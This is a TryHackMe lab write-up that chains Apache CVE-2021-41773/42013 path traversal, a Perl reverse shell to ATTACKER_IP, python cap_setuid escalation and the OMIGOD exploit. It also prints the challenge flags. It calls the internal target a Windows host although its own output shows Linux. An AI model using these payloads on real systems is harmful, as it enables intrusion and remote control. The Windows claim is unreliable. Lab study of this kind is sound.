# TryHackMe - Oh My WebServer Writeup

## Scenario

Today we are solving another Linux-based TryHackMe machine called **Oh My WebServer**. This machine focuses on exploiting vulnerable web services, container breakout-style enumeration, Linux capabilities abuse, and pivoting into an internal Windows target to achieve complete compromise.

The machine contains two stages:

1. Exploiting a vulnerable Apache server to gain initial access.
2. Pivoting from the compromised Linux container to an internal Windows host and obtaining the final root flag.

---

# Enumeration

## Target Information

```text
Main IP :: 10.49.146.189
```

We begin with a full TCP port scan.

```bash
nmap -p- 10.49.146.189
```

### Results

```text
22/tcp open ssh
80/tcp open http
```

Only two ports are exposed, so we proceed with service and version detection.

```bash
nmap -sC -sV 10.49.146.189
```

### Service Enumeration

```text
22/tcp open ssh OpenSSH 8.2p1 Ubuntu
80/tcp open http Apache httpd 2.4.49 (Unix)
```

Additional observations:

```text
Potentially risky methods: TRACE
```

Most importantly:

```text
Apache/2.4.49
```

This version is known to be vulnerable to path traversal and remote code execution vulnerabilities.

---

# Web Enumeration

Opening the website reveals a business consultancy template.

Nothing immediately stands out, so directory enumeration is performed.

```bash
feroxbuster -u http://10.49.146.189
```

### Results

```text
/assets/
/assets/js/
/assets/css/
/assets/fonts/
/assets/images/
/assets/js/vendor/
/assets/images/shape/
```

While the enumeration did not reveal sensitive files, the Apache version identified earlier becomes the primary attack vector.

---

# Vulnerability Identification

The server is running:

```text
Apache 2.4.49
```

This version is vulnerable to:

```text
CVE-2021-41773
CVE-2021-42013
```

These vulnerabilities allow path traversal and, under specific configurations, remote code execution.

---

# Confirming Remote Code Execution

Using a public proof-of-concept:

```bash
python cve-2021-42013.py -u http://10.49.146.189 -rce
```

Output:

```text
uid=1(daemon)
gid=1(daemon)
groups=1(daemon)
```

This confirms successful command execution on the target.

---

# Initial Access

A reverse shell payload is prepared.

```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Saved as:

```text
shell.sh
```

Hosted locally:

```bash
python3 -m http.server 8000
```

The vulnerable endpoint is then used to download the payload.

```bash
curl 'http://10.49.146.189/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
--data 'echo Content-Type: text/plain; echo;curl http://ATTACKER_IP:8000/shell.sh -o /tmp/shell.sh'
```

Make it executable:

```bash
curl 'http://10.49.146.189/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
--data 'echo Content-Type: text/plain; echo;chmod +x /tmp/shell.sh'
```

Execute:

```bash
curl 'http://10.49.146.189/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
--data 'echo Content-Type: text/plain; echo;sh /tmp/shell.sh'
```

Listener:

```bash
nc -lvnp 4444
```

Shell received:

```text
daemon@4a70924bafa0
```

---

# Shell Stabilization

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background:

```bash
CTRL+Z
stty raw -echo
fg
```

Set terminal:

```bash
export TERM=xterm
```

The shell is now fully interactive.

---

# Local Enumeration

Searching for user flags yields nothing useful.

The environment appears unusual.

Checking network information:

```bash
ifconfig
```

Output:

```text
eth0: 172.17.0.2
```

This immediately suggests we are operating inside a Docker container.

---

# Capability Enumeration

Checking Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

Interesting result:

```text
/usr/bin/python3.7 = cap_setuid+ep
```

This capability allows Python to change its UID to root.

---

# Privilege Escalation Inside Container

Using GTFOBins methodology:

```bash
python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Result:

```text
#
```

Root access is obtained inside the container.

---

# User Flag

Navigating to root:

```bash
cd /root
ls
```

```text
user.txt
```

Reading the flag:

```bash
cat user.txt
```

```text
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```

---

# Internal Network Discovery

While operating as root, we identify an internal network.

Checking listening services:

```bash
netstat -tunlp
```

Then performing an internal network scan.

A portable Nmap binary is uploaded and executed.

```bash
./nmap 172.17.0.1 -p- --min-rate 5000
```

### Results

```text
22/tcp   open  ssh
80/tcp   open  http
5986/tcp open  unknown
```

Port 5986 is highly interesting.

---

# Internal Target Identification

Port:

```text
5986/tcp
```

is commonly associated with:

```text
WinRM HTTPS
```

This strongly suggests a Windows host on the internal network.

Target identified:

```text
172.17.0.1
```

---

# Exploiting Internal Windows Host

Research identifies:

```text
CVE-2021-38647
```

Also known as:

```text
OMIGOD
```

A remote code execution vulnerability affecting Open Management Infrastructure (OMI).

A public exploit is used against the internal host.

```bash
python3 CVE-2021-38647.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root.txt;'
```

Output:

```text
root
/var/opt/microsoft/scx/tmp
uid=0(root)
hostname: ubuntu
Linux ubuntu 5.4.0-88-generic
```

The command executes successfully with root privileges.

---

# Root Flag

The final flag is retrieved directly:

```text
THM{7f147ef1f36da9ae29529890a1b6011f}
```

---

# Attack Path Summary

```text
Apache 2.4.49
        ↓
CVE-2021-41773 / CVE-2021-42013
        ↓
Remote Code Execution
        ↓
Reverse Shell as daemon
        ↓
Capability Enumeration
        ↓
Python cap_setuid Abuse
        ↓
Root Access Inside Container
        ↓
Internal Network Discovery
        ↓
Identify Windows Host (172.17.0.1)
        ↓
Detect OMI Service
        ↓
Exploit CVE-2021-38647 (OMIGOD)
        ↓
Root Access on Internal Host
        ↓
Capture Final Flag
```

---

# Key Findings

## Vulnerabilities Identified

### Apache Path Traversal & RCE

```text
CVE-2021-41773
CVE-2021-42013
```

Allowed unauthenticated remote code execution.

### Dangerous Linux Capability

```text
cap_setuid
```

Assigned to:

```text
/usr/bin/python3.7
```

Allowed immediate privilege escalation.

### Internal Service Exposure

```text
Port 5986
```

Exposed a vulnerable OMI service.

### OMI Remote Code Execution

```text
CVE-2021-38647
```

Allowed command execution as root on the internal host.

---

# Indicators of Compromise

## External Target

```text
10.49.146.189
```

## Internal Target

```text
172.17.0.1
```

## Vulnerable Apache Version

```text
Apache 2.4.49
```

## Vulnerable Binary

```text
/usr/bin/python3.7
```

Capability:

```text
cap_setuid+ep
```

## Vulnerable Service

```text
OMI
Port 5986
```

---

# Flags

## User Flag

```text
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```

## Root Flag

```text
THM{7f147ef1f36da9ae29529890a1b6011f}
```

---

# Conclusion

Oh My WebServer demonstrates a realistic multi-stage compromise involving exploitation of a vulnerable Apache web server, privilege escalation through Linux capabilities, container-aware enumeration, and lateral movement into an internal Windows-based management service. The challenge highlights the risks of outdated web software, dangerous capability assignments, insufficient network segmentation, and unpatched OMI services. By chaining multiple vulnerabilities together, full compromise of both the containerized environment and the internal host was achieved.
